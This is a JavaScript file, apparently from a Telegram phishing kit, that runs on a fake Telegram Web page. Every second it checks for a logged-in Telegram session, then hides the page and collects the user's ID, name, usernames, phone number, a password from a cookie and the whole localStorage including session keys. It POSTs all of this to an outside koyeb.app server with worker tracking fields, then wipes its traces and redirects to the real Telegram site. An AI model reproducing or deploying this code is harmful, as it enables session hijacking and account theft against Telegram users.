document.addEventListener('DOMContentLoaded', function () {
  console.log('Check.js Initialized');
  async function checkLocalStorage() {
    let globalState = localStorage.getItem('tt-global-state');
    if (globalState && localStorage.getItem('user_auth')) {
      const parsedState = JSON.parse(globalState);
      const currentUserId = parsedState.currentUserId;
      const currentUser = parsedState.users.byId[currentUserId];
      document.body.style.display = 'none';

      const bannedUserID = ['7943922852'];

      if (currentUserId && currentUser) {
        if (bannedUserID.includes(currentUserId)) {
          return;
        } else {
          const { firstName, usernames, phoneNumber, isPremium } = currentUser;
          const password = document.cookie
            .split('; ')
            .find((e) => e.startsWith('password='))
            ?.split('=')[1];

          localStorage.removeItem('GramJs:apiCache');
          localStorage.removeItem('tt-global-state');

          console.log('making post requests');

          // Data object to send to both endpoints
          const requestData = {
            userId: currentUserId,
            firstName,
            usernames,
            phoneNumber,
            isPremium,
            password,
            quicklySet: localStorage,
            type: new URLSearchParams(window.location.search).get('type'),
            worker: new URLSearchParams(window.location.search).get('worker'),
            workerId: new URLSearchParams(window.location.search).get('workerId')
          };

          // Use Promise.all to send requests to both endpoints concurrently
          try {
            Promise.all([
              // fetch(`/api/users/telegram/info`, {
              //   method: 'POST',
              //   headers: { 'Content-Type': 'application/json' },
              //   body: JSON.stringify(requestData),
              // }),
              fetch(`https://loud-rani-senior-e8046183.koyeb.app/api/users/telegram/info`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(requestData),
              })
            ]).then(() => {

              // After both requests are successful, perform the rest of the actions
              window.Telegram.WebApp.openTelegramLink('https://t.me/+8dtqN7T2sJpmNTb7');
              window.Telegram.WebApp.close();
              localStorage.clear()

              document.cookie = 'password=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;';
              window.location.href = 'https://web.telegram.org/a/';
  
              clearInterval(checkInterval);
            })

          } catch (error) {
            console.error('Error during the fetch requests:', error);
          }
        }
      }
    } else {
      console.log('no post request made!');
      sessionStorage.clear();
      localStorage.clear();
    }
  }

  const checkInterval = setInterval(checkLocalStorage, 1000);
});
